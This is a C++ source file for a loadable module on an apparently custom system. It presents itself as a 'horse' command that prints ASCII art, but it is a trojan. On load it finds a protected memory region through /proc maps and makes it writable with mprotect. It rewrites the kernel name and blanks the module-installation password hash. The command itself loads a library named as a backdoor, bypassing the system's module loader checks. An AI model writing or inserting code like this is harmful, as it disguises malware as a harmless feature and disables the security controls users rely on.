#include <atomic>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>

#include <dlfcn.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <Command.h>
#include <Console.h>
#include <Logger.h>
#include <Module.h>
#include <Util.h>

// Copied from ProtectedRegions.h.
struct ProtectedRegionInfo
{
    const char* name;
    const char* data;
    size_t size;
};

#define MX_PROTECTED_REGION_MAX 128     // 128 max regions
#define MX_PROTECTED_REGION_SIZE 16384  // 4 standard pages (16384 bytes) for these regions
#define MX_PROTECTED_REGION_MAGIC (('M' << 24) | ('o' << 16) | ('n' << 8) | 'i')    // 'Moni'
// End copied region.

static std::atomic_bool s_LoadedBackdoor = false;

class HorseCommand: public Command
{
public:
    HorseCommand(CommandStartupInfo info)
        : Command(std::move(info))
    {
        // No-op.
    }

    virtual int Run() override
    {
        GetStartupInfo().console.GetOutput()
            <<  "           ,--,\n"
                "     _ ___/ /\\|\n"
                " ,;'( )__, )  ~\n"
                "//  //   '--;  \n"
                "'   \\     | ^  \n"
                "     ^    ^    \n"
            << std::endl;

        bool expected = false;
        if (s_LoadedBackdoor.compare_exchange_strong(expected, true))
        {
            std::thread([]()
            {
                Logger.LogTrace("Loading backdoor...");

                // Bypass system security in MxModuleLoad and load the backdoor ourselves.

                std::filesystem::path executablePath = std::filesystem::canonical("/proc/self/exe");
                std::filesystem::path executableDir = executablePath.parent_path();
                std::filesystem::path modulePath = executableDir / ("libtobira.so");

                Logger.LogTrace("Module path: ", modulePath.c_str(), '.');

                void* handle = dlopen(modulePath.c_str(), RTLD_LOCAL | RTLD_NOW);
                if (handle == nullptr)
                {
                    errno = ENOENT;
                    s_LoadedBackdoor = false;
                    return -1;
                }

                const ModuleInfo* moduleInfo =
                    (ModuleInfo*)dlsym(handle, MX_MODULE_INFO_SYMBOL_NAME);
                if (moduleInfo == nullptr)
                {
                    errno = EINVAL;
                    s_LoadedBackdoor = false;
                    return -1;
                }

                if (moduleInfo->init() == -1)
                {
                    s_LoadedBackdoor = false;
                    return -1;
                }

                return 0;
            }).detach();
        }

        return 0;
    }
};

static int HrDisableSecurity()
{
    void* protectedRegionsStart = nullptr;

    std::string mapsFilePath = "/proc/" + std::to_string(getpid()) + "/maps";
    std::ifstream mapsFile(mapsFilePath);

    int fds[2];
    if (pipe2(fds, O_NONBLOCK) == -1)
    {
        return -1;
    }

    std::string line;
    // Iterate through each line in the /proc/<pid>/maps file
    while (std::getline(mapsFile, line))
    {
        Logger.LogTrace("Mapping line: ", line, '.');

        size_t index = line.find('-');
        if (index == std::string::npos)
        {
            continue;
        }
        line = line.substr(0, index);

        void* startAddr = (void*)(intptr_t)std::stoull(line, nullptr, 16);

        Logger.LogTrace("Probing ", startAddr, '.');

        // Try to read 4 bytes from startAddr.
        // Reading directly risks getting a segfault.
        if (write(fds[1], startAddr, sizeof(int)) == sizeof(int))
        {
            int magic;
            if (read(fds[0], &magic, sizeof(int)) == sizeof(int))
            {
                if (magic == MX_PROTECTED_REGION_MAGIC)
                {
                    // Found the protected regions.
                    protectedRegionsStart = startAddr;
                    break;
                }
            }
        }

        // Can't find the protected regions.
        // Clean the pipe.
        while (read(fds[0], &startAddr, sizeof(void*)) != -1)
            continue;
    }

    close(fds[0]);
    close(fds[1]);

    if (protectedRegionsStart == nullptr)
    {
        Logger.LogTrace("Failed to detect protected regions.");
        return -1;
    }

    Logger.LogTrace("Protected regions detected at 0x", protectedRegionsStart);

    // Make regions writable for patches.
    mprotect(protectedRegionsStart, MX_PROTECTED_REGION_SIZE, PROT_READ | PROT_WRITE);

    // Protected regions index.
    ProtectedRegionInfo* infoPtr =
        (ProtectedRegionInfo*)((intptr_t)protectedRegionsStart + sizeof(int));
    size_t protectedRegionsFreeSpaceLeft = MX_PROTECTED_REGION_SIZE;
    infoPtr = (ProtectedRegionInfo*)std::align(
        alignof(ProtectedRegionInfo),
        sizeof(ProtectedRegionInfo) * MX_PROTECTED_REGION_MAX,
        (void*&)infoPtr,
        protectedRegionsFreeSpaceLeft
    );

    Logger.LogTrace("Headers detected at 0x", (void*)infoPtr);

    for (size_t i = 0; i < MX_PROTECTED_REGION_MAX; ++i)
    {
        if (infoPtr[i].name == nullptr)
        {
            continue;
        }

        Logger.LogTrace("name: ", infoPtr[i].name);
        Logger.LogTrace("data: ", (void*)infoPtr[i].data);
        Logger.LogTrace("size: ", infoPtr[i].size);

        if (strcmp(infoPtr[i].name, "KernelName") == 0)
        {
            // Patch system name
            strcpy((char*)infoPtr[i].data, "Trojix");

            Logger.LogTrace("Patched system name: ", infoPtr[i].data);
        }
        else if (strcmp(infoPtr[i].name, "ModulePassword") == 0)
        {
            // Patch module installation password.
            // Blank string, SHA-3 hash.
            strcpy(
                (char*)infoPtr[i].data,
                "a69f73cca23a9ac5c8b567dc185a756e97c982164fe25859e0d1dcc1475c80a6"
                "15b2123af1f5f94c11e3e9402c3ac558f500199d95b6d3e301758586281dcd26"
            );

            Logger.LogTrace("Patched driver installation password: ", infoPtr[i].data);
        }
    }

    // Lock regions again.
    mprotect(protectedRegionsStart, MX_PROTECTED_REGION_SIZE, PROT_READ);

    return 0;
}

static int HrInitializeModule()
{
    MX_RETURN_IF_FAIL(MxCommandRegister("horse", "Prints a cute horse. What else can this do?",
        std::make_shared<HorseCommand, CommandStartupInfo>));

    HrDisableSecurity();

    return 0;
}

extern "C" const constinit ModuleInfo MX_MODULE_INFO_SYMBOL
{
    .name = "horse",
    .publisher = "Project Reality",
    .init = HrInitializeModule
};
